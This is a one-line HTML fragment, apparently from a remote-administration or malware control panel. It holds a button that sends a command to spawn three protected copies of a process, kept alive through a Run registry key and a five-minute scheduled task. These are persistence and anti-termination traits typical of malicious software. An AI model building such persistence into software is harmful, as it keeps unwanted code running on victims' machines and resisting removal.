...
<button type="button" class="cmd-btn" style="background:#2a0a0a;border-color:#f44336;" onclick="sendCmd('PROTECT_PROCESS')">🔒 Spawn Protected Copies <span>Launch 3 copies — Run key + Scheduled Task (5min) — auto-protect after 15s</span></button>
